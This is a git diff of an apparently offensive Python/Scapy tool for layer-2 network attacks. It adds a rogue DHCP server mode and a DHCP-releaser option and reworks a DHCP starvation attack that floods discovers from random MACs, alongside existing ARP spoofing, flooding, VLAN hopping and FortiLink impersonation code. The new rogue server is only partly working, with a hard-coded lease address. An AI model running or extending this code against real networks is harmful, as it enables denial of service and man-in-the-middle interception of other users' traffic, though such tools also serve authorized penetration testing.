@@ -8,6 +8,8 @@ import os
 import threading
 import time
 import random
+import ipaddress
+
 from scapy.all import *
 from scapy.contrib.lldp import *
 from scapy.contrib.lacp import *
@@ -25,6 +27,10 @@ arpspoof_parser = subparsers.add_parser('arpspoof',help='ARP Spoofing')
 
 dhcpstarvation_parser = subparsers.add_parser('dhcpstarvation',help='DHCP Starvation attack')
 
+dhcpserver_parser = subparsers.add_parser('dhcpserver',help='DHCP Server')
+
+dhcpreleaser_parser = subparsers.add_parser('dhcpreleaser',help='DHCP Releaser')
+
 
 main_parser.add_argument("-v","--verbose", help="Increase output verbosity",action='count',default=0)
 main_parser.add_argument("-i","--interface", help="Network Interface",default="ens33")
@@ -40,6 +46,11 @@ arpspoof_parser.add_argument("-f","--frequency",help="Frequency of ARP replies, 
 
 dhcpstarvation_parser.add_argument("-c","--count",help="Amount of DHCP requests, default=1000",default=1000,type=int)
 dhcpstarvation_parser.add_argument("-s","--dhcpserver",help="IP of DHCP Server, if known specified, retrieve")
+
+dhcpserver_parser.add_argument("-s","--scope",help="IP Range of provided IPs by the DHCP Server. Format: 192.168.100.20-192.168.100.50",required=True)
+dhcpserver_parser.add_argument("-sn","--subnetmask",help="Subnetmask for the provided IPs",required=True)
+dhcpserver_parser.add_argument("-g","--gateway",help="Provided the Gateway IP. By default this host will be the gateway",required=True)
+dhcpserver_parser.add_argument("-d","--dns",help="Provided single IP address for DNS Server",default="8.8.8.8")
 
 
 #vlanhop_parser.add_argument("-a","--activerecon",help="Send additional packets to detect VLANs. Noisy!")
@@ -69,6 +80,11 @@ event_LACP_Established = threading.Event()
 
 src_mac = ""
 
+dhcp_leases = {}
+
+dhcp_leases["00:11:22:33:44:55"] = {"ip": "192.168.1.100", "expiry": 5000, "transaction_id":0x123123}
+
+
 # level 0 = standard output, level 1 = info, level 2 = debug
 def dprint(*args,level=0):
    if level <= main_args.verbose:
@@ -85,21 +101,47 @@ def mac_to_bin(mac_address):
     return bytes(int(b, 16) for b in mac_address.split(':'))
 
 
-def handle_dhcp_packet(packet):
-    if DHCP in packet and packet[DHCP].options[0][1] == 2:  # DHCP Offer
-        offered_ip = packet[BOOTP].yiaddr
-        transcation_id = packet[BOOTP].xid
-        send_dhcp_request(offered_ip,transcation_id)
+def allocate_ip(mac):
+   global dhcp_leases
+   dhcp_leases[mac]['ip'] = "192.168.1.100"
+   dhcp_leases[mac]['expiry'] = 5000
 
-def send_dhcp_discover():
+
+def handle_dhcp_packet(packet,transaction_id):
+    global dhcp_leases
+    dprint("handle_dhcp_packet(). Options:",packet[DHCP].options[0][1],level=2)
+    if DHCP in packet and packet[DHCP].options[0][1] == 2 and packet[BOOTP].xid == transaction_id:  # DHCP Offer
+        offered_ip = packet[BOOTP].yiaddr
+        send_dhcp_request(offered_ip,transaction_id)
+    if DHCP in packet and packet[DHCP].options[0][1] == 1 and transaction_id == "":  # DHCP Discover
+        dhcp_leases[str(packet[Ether].src)] = {"transaction_id":packet[BOOTP].xid}
+        allocate_ip(packet[Ether].src)
+        send_dhcp_offer(packet[Ether].src)
+
+
+def send_dhcp_offer(mac):
+    global dhcp_leases
+    dhcp_lease = dhcp_leases[mac]
+    dprint(dhcp_lease,level=2)
+    dhcp_offer = (
+        Ether(dst=mac) /
+        IP(dst=dhcp_lease["ip"]) /
+        UDP(sport=68, dport=67) /
+        BOOTP(op=2,chaddr=mac_to_bin(mac),xid=dhcp_lease["transaction_id"],yiaddr=dhcp_lease["ip"]) /
+        DHCP(options=[("message-type", "offer"), ("lease_time",3600), ("subnet_mask","255.255.255.0"), "end"])
+        )
+    sendp(dhcp_offer,verbose=False)
+
+
+def send_dhcp_discover(transaction_id):
     dhcp_discover = (
         Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") /
         IP(src="0.0.0.0", dst="255.255.255.255") /
         UDP(sport=68, dport=67) /
-        BOOTP(op=1, chaddr=mac_to_bin(src_mac) + b"\x00" * 10,xid=random.randint(0, 0xFFFFFFFF)) /
+        BOOTP(op=1, chaddr=mac_to_bin(src_mac) + b"\x00" * 10,xid=transaction_id) /
         DHCP(options=[("message-type", "discover"), "end"])
     )
-    sendp(dhcp_discover)
+    sendp(dhcp_discover,verbose=False)
 
 def send_dhcp_request(offered_ip,transaction_id):
     dhcp_request = (
@@ -107,49 +149,45 @@ def send_dhcp_request(offered_ip,transaction_id):
         IP(src="0.0.0.0", dst="255.255.255.255") /
         UDP(sport=68, dport=67) /
         BOOTP(op=1, chaddr=mac_to_bin(src_mac) + b"\x00" * 10,xid=transaction_id) /
-        DHCP(options=[("message-type", "request"), 
+        DHCP(options=[("message-type", "request"),
                       ("requested_addr", offered_ip),
                       "end"])
     )
-    sendp(dhcp_request)
-
+    print("Requesting",offered_ip,"...")
+    sendp(dhcp_request,verbose=False)
 
 def dhcpstarvation():
     global src_mac
 
-    print("Launching DHCP Server attack")
+    print("Launching DHCP Server exhaustion attack")
     for i in range(main_args.count):
-
+       transaction_id = random.randint(0,0xFFFFFFFF)
        src_mac = unicast_randMAC()
-       send_dhcp_discover()
-       sniff(prn=handle_dhcp_packet, filter="udp and port 68", count=1, timeout=1)
+       send_dhcp_discover(transaction_id)
+       sniff(prn=lambda packet:handle_dhcp_packet(packet,transaction_id), filter="udp and port 68", count=1, timeout=1)
 
 
-def dhcpstarvation_old(): 
+def dhcpserver():
+   print("Launching DHCP Server")
+   print(main_args.scope)
+   start_ip,end_ip = main_args.scope.split('-')
+   start_ip= ipaddress.IPv4Address(start_ip)
+   end_ip = ipaddress.IPv4Address(end_ip)
+   print("Start IP:",start_ip)
+   print("End IP:",end_ip)
 
-   if not (main_args.dhcpserver):
-      print("Define IP")
-      return
+   subnetmask=main_args.subnetmask
 
-   for i in range(main_args.count):
-      fakeMAC=RandMAC()
-      dhcp_request = (Ether(src=fakeMAC,dst="FF:FF:FF:FF:FF:FF")
-                     /IP(src="0.0.0.0",dst="255.255.255.255")
-                     /UDP(sport=68, dport=67)
-                     /BOOTP(chaddr=fakeMAC,xid=0x123456)
-                     /DHCP(options=[("message-type","request"),("client_id", b"\x01\x00\x11\x22\x33\x44\x55"),"end"]))
-      sendp(dhcp_request)
+   gateway = ipaddress.IPv4Address(main_args.gateway)
 
-   dhcp_discover = (
-   Ether(src="00:11:22:33:44:55", dst="ff:ff:ff:ff:ff:ff") /
-   IP(src="0.0.0.0", dst="255.255.255.255") /
-   UDP(sport=68, dport=67) /
-   BOOTP(op=1, chaddr=b"\x00\x11\x22\x33\x44\x55" + b"\x00" * 10, xid=0x1000) /
-   DHCP(options=[("message-type", "discover"), "end"])
-   )
+   dns = ipaddress.IPv4Address(main_args.dns)
 
-   # Send the DHCP discover packet
-   
+   print("Listening for Discover packages")
+
+   while(True):
+      sniff(prn=lambda packet:handle_dhcp_packet(packet,""), filter="udp and port 68", timeout=100)
+
+
 
 def fortilink_isl(lldp_keep_alive):
     print("Establishing FortiLink ISL...",end="",flush=True)
@@ -169,7 +207,7 @@ def fortilink_isl(lldp_keep_alive):
     sendp(lacp_response,verbose=0)
 
     packet=sniff(filter="ether proto 0x8809",count=1,timeout=60)
-    
+
     # Set Partner Settings
     lacp_response[LACP].partner_system_priority = packet[0][LACP].actor_system_priority
     lacp_response[LACP].partner_system = packet[0][LACP].actor_system
@@ -218,7 +256,7 @@ def arpspoof():
       #packet to target
       sendp(Ether(dst=targetMAC)/ARP(op="is-at",psrc=main_args.impersonate,pdst=main_args.target,hwdst=targetMAC),count=1,verbose=False)
       #packet to impersonated host
-      sendp(Ether(dst=impersonateMAC)/ARP(op="is-at",psrc=main_args.target,pdst=main_args.impersonate,hwdst=impersonateMAC),count=1,verbose=False)      
+      sendp(Ether(dst=impersonateMAC)/ARP(op="is-at",psrc=main_args.target,pdst=main_args.impersonate,hwdst=impersonateMAC),count=1,verbose=False)
       time.sleep(main_args.frequency)
 
 
@@ -368,11 +406,17 @@ if os.geteuid() != 0:
 if action=="flood":
    l2_flood(floodtype=main_args.floodtype)
 
-if action=="vlanhop":
+elif action=="vlanhop":
    vlanhop()
 
-if action=="arpspoof":
+elif action=="arpspoof":
    arpspoof()
 
-if action=="dhcpstarvation":
+elif action=="dhcpstarvation":
    dhcpstarvation()
+
+elif action=="dhcpserver":
+   dhcpserver()
+
+if not action:
+   main_parser.print_help()
